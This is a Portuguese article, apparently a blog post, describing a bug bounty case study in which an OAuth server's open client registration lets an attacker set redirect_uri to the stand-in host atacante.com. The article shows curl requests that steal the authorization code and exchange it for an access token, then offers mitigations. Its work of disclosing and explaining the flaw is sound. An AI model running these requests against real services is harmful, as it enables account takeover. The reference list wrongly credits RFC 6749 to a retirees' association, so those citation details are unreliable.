![OAuth 2.0](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e1eyvg2f7wgnttm924b5.png)
# O Impacto da manipulação do parâmetro redirect_uri em fluxos OAuth 2.0 na segurança de Aplicações Web


## Resumo
> As aplicações web modernas enfrentam alguns desafios gradativos quanto a sua segurança, em virtude das integrações com serviços de autorização externos, como o protocolo OAuth 2.0 (Open Authorization), que se tornam cada vez mais comuns. Este texto tem propósito de investigar como uma manipulação inadequada no parâmetro *redirect_uri* em aplicações que utilizam fluxos OAuth 2.0 podem comprometer a sua segurança, permitindo o roubo de códigos de autorização e a obtenção dos tokens de acesso em sistemas web. Através de um estudo de caso prático de um report para uma plataforma de bug bounty, é possível analisar como um processo sistemático de reconhecimento e filtragem de subdomínios podem identificar vulnerabilidades, evidenciando a importância de boas práticas seguras de desenvolvimento e uma validação mais minuciosa de redirecionamentos autorizados.
> 

## Palavras-chave

Segurança Ofensiva; Aplicações web; OAuth; Reconhecimento; *redirect_uri*

## 1 Introdução

Os sistemas web com o avanço tecnológico dependem cada vez mais de serviços externos para autenticação e autorização de usuários. Em consequência disso, protocolos como o OAuth 2.0 se tornam uma opção interessante de uso, por conta da flexibilidade e capacidade de integrar múltiplos serviços sem exigir o compartilhamento direto de credenciais sensíveis.

No entanto, essa grande flexibilidade pode também implicar em uma superfície de ataque mais ampliada. Em um contexto de falhas na configuração ao ser implementado ou a validação de parâmetros críticos não serem feitas da maneira apropriada, podem ocasionar em ataques com impacto real sobre a segurança dos usuários, uma vez que o OAuth é apenas um protocolo que ajuda um website ou aplicação a acessar recursos que estão hospedados em outros web apps em nome do usuário.

Este estudo se propõe a compreender como a manipulação do parâmetro *redirect_uri* em fluxos OAuth 2.0 pode compremeter a segurança de aplicações web, por meio de uma fundamentação teórica e um estudo prático realizado em ambiente de bug bounty, demonstrando em um cenário controlado como as falhas que aparentam ser simples podem resultar em um compromentimento da segurança.

## 2 Fundamentação Teórica

### 2.1 Protocolo OAuth 2.0

O OAuth 2.0 (Open Authorization) é um protocolo para delegar autorização, assim permitindo que  que um cliente terceiro possa ter acesso a um serviço HTTP, ou seja, clientes que podem acessar recursos em nome de um usuário, sem a necessidade de compartilhar as credenciais. A arquitetura é definida por alguns componentes importantes para seu sistema: *Proprietário do recurso (Resource Owner)*, a entidade que possui os dados protegidos, usuário final; *Cliente (Client)*, cliente que deseja ter acesso aos dados em nome do proprietário do recurso;  *Servidor de recurso (Resource Server),* o servidor que será hospedados os recursos protegidos, sendo possível aceitar e também responder a solicitações usando tokens de acesso; *Servidor de autorização (Authorization Server)*, componente que realiza a autenticação do usuário e emite os tokens de acesso.

### 2.2 Fluxo de autorização e o papel do parâmetro *redirect_uri*

O servidor de autorização OAuth 2.0 retorna para uma melhor segurança um código de autorização (Authorization Code) e é a partir desse código que ocorre a troca por um token de acesso. Esse fluxo necessita da interação do usuário, que por sua vez concede a permissão necessária em uma tela de consentimento.

A partir desse contexto, um elemento importante nesse fluxo é o parâmetro *redirect_uri.* Ele indica para onde o servidor de autorização deve realizar o redirecionamento do usuário e por consequência o código de autorização após o consentimento. 

Para a segurança, a especificação do OAuth (RFC674) precisa de validação rigorosa do *redirect_uri.* No contexto do estudo de caso, o uso desse parâmetro é feito de maneira deliberada, sem qualquer tipo de validação que possa previnir que os códigos de autorização que são confidenciais sejam enviados a domínios indevidos.

### 2.3 Impacto da falha na validação do *redirect_uri*

Se o servidor que implementa o OAuth 2.0 sem qualquer validação mais específica e restrita quanto ao *redict_uri,* pode levar a um atacante a registrar um cliente malicioso que pode deixar o *redirect_uri* sob seu controle, induzir uma possível vítima a se autenticar em uma tela legítima, já que essa falha é feita nos intermédios do próprio servidor onde o OAuth  está alocado, receber o código de autorização dessa vítima e trocar por um token de acesso válido. 

Essa falha afeta o modelo de confiança, na forma com que o protocolo é configurado, tornando assim possível ataques de phishing muito convincentes e comprometendo contas de usuários.

## 3 Metodologia

Esta pesquisa foi realizada de forma estruturada e ética, em um ambiente controlado, por se tratar de um contexto de programa de bug bounty, com as regras apresentadas, sobre o que pode ou não ser feito dentro do escopo determinado. A base desse trabalho é ilustrar a partir do estudo de caso, como o reconhecimento e análise de endpoints, é possível revelar falhas, em específico fluxos de autenticação que são baseados no protocolo OAuth 2.0.

A etapa inicial consistiu em reconhecimento, entendendo modelo de negócios, posicionamento da empresa em questão no mercado. Para que isso fosse possível, foram analisadas as informações públicas disponíveis em plataformas de business intelligence, como o **Crunchbase**, além do próprio site oficial e a documentação técnica. Ademais, ocorreu o mapeamento da superfície de ataque, com o propósito de identificar endpoints públicos.

Ao longo da etapa, se fundamentou técnicas de enumeração de subdomínios, com ferramentas como **assetfinder**, **subfinder** e **subcat**. Adicionalmente, depois da enumeração dos subdomínios, também foi filtrado os que estavam “vivos” e retornando ao menos status code 200, 301 e 302, através da ferramenta **httpx**. Com a filtragem feita e a quantidade de subdomínios existentes, o **katana** foi usado para enumeração de endpoints, por se tratar de uma ferramenta de crawling automatizada, buscando uma navegação mais inteligente e prática. Como se tratava de múltiplos subdomínios, naquele momento foi julgado mais estratégico usar o katana para automatizar as descobertas de rotas. Em um desses momentos, havia um endpoint interessante, o  /.well-know-oauth-authorization-server, um endpoint do protocolo OAuth. A resposta desse endpoint  usando a ferramenta **cURL** trouxe informações interessantes sobre os parâmetros suportados, incluindo os endpoints de autorização (/authorize), de troca de tokens (/token) e registro de clientes (/register).

```html
HTTP/2 200 OK
Cabeçalho

Corpo:
{"issuer":"https://subdominio.alvo",
"authorization_endpoint":"https://subdominio.alvo/authorize",
"token_endpoint":"https://subdominio.alvo/token",
"registration_endpoint":"https://subdominio.alvo/register",
"response_types_supported":["code"],"response_modes_supported":["query"],
"grant_types_supported":["authorization_code","refresh_token"],
"token_endpoint_auth_methods_supported":["client_secret_post",
"client_secret_basic","none"],
"registration_endpoint_auth_methods_supported":["client_secret_post",
"client_secret_basic","none"],
"code_challenge_methods_supported":["S256"]}

```

Em seguida, realizou-se uma análise rigorosa com relação aos parâmetros aceitos por esses endpoints, com um foco maior no parâmetro *redrect_uri*, que pode se tornar sensível em contextos que aceitam qualquer tipo de valor. Neste ciclo, sucedeu observar se havia uma validação adequada do URI, de redirecionamento fornecido pelo cliente e se era possível dentro dessa dinâmica cadastrar domínios externos ou não confiáveis por meio do endpoint de registro.

O estágio seguinte refletiu no desenvolvimento de uma **prova de conceito** (PoC). Foram feitas requisições reais simulando o registro de um aplicativo com o parâmetro *redirect_uri* arbitrário, incluindo domínios externos sob o controle do pesquisador, que geraram um código de autorização válido. Em seguida, foi replicado o processo end-to-end, com a captura do código de autorização redirecionado para um domínio malicioso. Ao ser obtido, esse código foi trocado com sucesso por um token de acesso no endpoint /token, demonstrando a exploração efetiva da vulnerabilidade.

Em conclusão, toda a pesquisa foi documentada, com registro das requisiçõies realizadas, as respostas obtidas e as evidências que comprovam a obtenção de maneira indevida desses tokens. Esse registro é meramente educativo a fim de garantir a consistência dos resultados e permitir uma análise maior dos impactos, medidas corretivas necessárias, oferecer uma contribuição mais estruturada para uma discussão acadêmica e profissional sobre segurança em aplicações web.

## 4 Estudo de caso: exploração do *redirect_uri*

### 3.1 Registro do aplicativo malicioso

Constatou-se que a rota /register aceitava registros de clientes com qualquer domínio que estivesse especificado como *redirect_uri,* sem validação.

**Requisição**:

```html
curl -X POST https://subdominio.alvo/register \
-H "Content-Type: application/json" \
-d '{
  "client_name": "App_malicioso",
  "redirect_uris": ["https://atacante.com"],
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}'

```

**Resposta:**

```json
{
  "client_id": "APP_MALICIOSO_ID",
  "client_secret": "SECRET",
  "redirect_uris": ["https://atacante.com"]
}

```

### 4.2 Fluxo de autenticação

Na sequência, o atacante poderia direcionar a vítima a rota /authorize com o *client_id* gerado  **e o *redirect_uri* malicioso.

```bash
https://subdominio.alvo/authorize?response_type=code&client_id=APP_MALICIOSO_ID&redirect_uri=REDIRECT_URI
```

Após a autenticação e o consentimento na tela do próprio domínio legítimo, o servidor de autorização redirecionava para o *redirect_uri*  externo registrado e assim deixava exposto o código de autorização na URL.

```bash
https://atacante.com/?code=_CODE_
```

### 4.3 Troca do código por Token de Acesso

Com o código obtido, o atacante solicitava um token de acesso legítimo da vítima.

**Requisição**

```bash
curl -X POST https://subdominio.alvo/token \
  -d "grant_type=authorization_code" \
  -d "code=_CODE_" \
  -d "redirect_uri=https://atacante.com" \
  -d "client_id=APP_MALICIOSO_ID" \
  -d "client_secret=SECRET"

```

**Resposta**

```bash
{
  "access_token": "TOKEN",
  "expires_in": 3600,
  "token_type": "bearer"
}

```

## 5 Resultados e Discussão

Os resultados demonstram a falha decorrente da validação inadequada do parâmetro *redirect_uri* em fluxos OAuth 2.0 ao ser implementada sem a análise de como o servidor irá reagir diante de um domínio “estranho”. A análise prática evidenciou, que ao permitir de maneira deliberada o registro de clientes com URIs de redirecionamento totalmente arbitrários e externos, o servidor de autorização expõe um vetor de ataque, que pode ser explorado por agentes maliciosos.

Um dos principais pontos é a possibilidade de interceptação de códigos de autorização válidos. Durante a execução da PoC, após o login e consentimento do usuário em uma interface oficial da própria aplicação, o servidor redirecionava o código de autorização para outra url registrada pelo atacante. Esse comportamento quebra o modelo de confiança na implementação do OAuth 2.0, quando não se tem uma verificação mais rigorosa por parte da aplicação que o incorpora.

Outro aspecto relevante é que os testes puderam confirmar a troca bem-sucedida do código de autorização interceptado por um token de acesso válido no endpoint /token. Assim, poderia ser utilizado para acessar recursos protegidos em nome do usuário alvo, possibilitando um risco de obtenção não autorizada de dados sensíveis.

Vale ressaltar ainda que existe um potencial em ataques de phishing, com grande grau de credibilidade. Por se tratar de um fluxo de autenticação por meio da própria aplicação legítima e autorizada, o usuário teria uma maior confiança no processo, mesmo com o redirecionamento malicioso. Essa característica aumenta o poder de persuasão de uma campanha de engenharia social se baseando nesse vetor.

Ressalta-se o papel importante da etapa de reconhecimento na identificação da vulnerabilidade. A partir do mapeamento dos endpoints e a inspeção das respostas do servidor, em especial do endpoint /.well-known/oauth-authorization-server, permitiu entender de forma sistemática pontos sensíveis do fluxo de autenticação.

Os pontos de exposição validam a necessidade de boas práticas de segurança no desenvolvimento e manutenção de sistemas que implementam OAuth. Desde a validação mais metódica com relação ao parâmetro fragilizado, que possam restringir os redirecionamentos indevidos, a implementação do PKCE (Proof Key for Code Exchange) para clientes públicos e aplicações, como forma de mitigar o roubo de códigos de autorização e por fim, auditorias regulares, que possam realizar revisões sistemáticas de endpoints, parâmetros sensíveis e mecanismos de registros de clientes.

É importante enfatizar a  importância de abordagens proativas em segurança de aplicações web, evidenciando o valor da análise ofensiva mais controlada por parte de plataformas bug bounty e uma estratégia complementar nas práticas tradicionais de desenvolvimento seguro.

## 6 Conclusão

A manipulação inadequada do parâmetro *redirect_uri*  no protocolo OAuth 2.0 de autorização apresenta uma vulnerabilidde que pode comprometer a segurança de aplicações web. O estudo de caso demonstra como uma exploração prática pode culminar no roubo de códigos de autorização e a obtenção indevida de tokens de acesso.

Isso evidencia a importância de processos de reconhecimento e a análise sistemática de endpoints, bem como a implementação mais rigorosa quanto a práticas seguras de desenvolvimento para que seja possível mitigar esses riscos.

## Referências

ASSOCIATION FOR THE ADVANCEMENT OF RETIRED PERSONS. *RFC 6749 – The OAuth 2.0 Authorization Framework*. Disponível em: https://datatracker.ietf.org/doc/html/rfc6749. 

INTERNET ENGINEERING TASK FORCE. *RFC 6819 – OAuth 2.0 Threat Model and Security Considerations*. Disponível em: [https://datatracker.ietf.org/doc/html/rfc6819](https://datatracker.ietf.org/doc/html/rfc6819).

OWASP FOUNDATION. *Testing for OAuth Weaknesses*. Disponível em: [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses).

PORTSWIGGER. *OAuth Authentication Security*. Disponível em: [https://portswigger.net/web-security/oauth](https://portswigger.net/web-security/oauth). 